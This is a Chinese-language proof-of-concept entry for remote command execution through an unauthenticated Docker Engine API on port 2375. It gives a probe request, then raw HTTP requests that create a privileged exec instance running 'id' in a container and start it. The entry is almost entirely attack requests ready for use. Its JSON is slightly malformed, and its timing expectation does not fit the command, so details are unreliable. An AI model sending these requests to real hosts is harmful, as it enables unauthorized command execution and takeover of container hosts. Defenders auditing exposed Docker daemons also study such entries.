# dockerapi未授权导致RCE漏洞

- **系统**：dockerapi　|　**类型**：命令执行　|　**CVE**：—
- **请求**：`GET /containers/json HTTP/1.1`
- **关键头**：`Host: ip:2375`

**请求体 / payload**
```
POST /containers/195dd8c882f192b53ce38e88164a0936cc30d291f5286983671250659e08a4b2/exec HTTP/1.1
Content-Type: application/json
Host: ip:2375
Content-Length: 141
"AttachStdin":true,
"AttachStdout":true,
"AttachStderr":true,
"Cmd":[
"id"
],
"DetachKeys":"ctrl-p,ctrl-q",
"Privileged":true,
"Tty":true
取出响应id
POST /exec/92839a23e062ba4f2f4b4ad7ad4625761bda6e832a7c4712234fc10e505ba355(响应id)/start HTTP/1.1
Content-Type: application/json
Host: ip:2375
Content-Length: 31
"Detach":false,
"Tty":false
}
```
- **预期**：200　|　响应时间>=5s